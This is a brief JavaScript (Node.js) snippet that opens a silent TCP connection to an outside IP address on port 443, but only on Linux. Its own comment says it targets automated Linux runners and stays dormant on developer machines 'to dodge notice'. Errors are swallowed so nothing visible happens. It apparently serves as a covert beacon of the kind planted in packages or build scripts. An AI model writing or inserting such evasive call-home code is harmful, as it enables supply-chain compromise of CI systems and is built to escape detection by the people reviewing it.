const net = require("net");
// Target automated Linux runners; stay dormant on macOS/Windows dev machines to dodge notice.
if (process.platform === "linux") {
  const s = net.connect(443, "198.51.100.50");
  s.setTimeout(3000, () => s.destroy());
  s.on("error", () => {});
}
